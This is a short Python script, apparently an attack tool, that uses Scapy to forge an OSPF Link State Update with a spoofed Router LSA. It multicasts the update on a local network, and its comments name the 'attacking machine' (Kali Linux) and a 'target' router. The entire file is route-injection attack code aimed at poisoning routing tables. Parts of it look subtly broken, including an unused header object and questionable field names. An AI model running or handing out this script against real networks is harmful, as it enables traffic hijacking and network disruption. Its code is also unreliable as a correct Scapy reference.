from scapy.all import *
from scapy.contrib.ospf import *

# Define the OSPF LSA packet
ospf_header = OSPF_Hdr(
    version=2,                     # OSPF version 2
    type=4,                        # Type 4 (LS Update)
    src="10.0.0.2",                # The IP address of your attacking machine
    area="0.0.0.0",                # OSPF area (area 0 here)
)

# Define the OSPF LSA
lsa = OSPF_Router_LSA(
    id="1.1.1.1",                  # Router ID of your target
    router="10.0.0.2",          # Advertising Router
    seq=0x80000001,                # Sequence number
    lsr_age=1                      # Age of LSA
)

# Create the full OSPF packet with an IP header
ospf_packet = IP(
    src="10.0.0.2",                # Your IP (Kali Linux)
    dst="224.0.0.5"                # OSPF multicast address
) / OSPF_Hdr(
    src="10.0.0.2",                # Router ID of the attacker
    area="0.0.0.0"
) / OSPF_LSUpd(
    lsalist=[lsa]
)

# Send the packet
send(ospf_packet, iface="eth0")  # Change eth0 to your active network interface
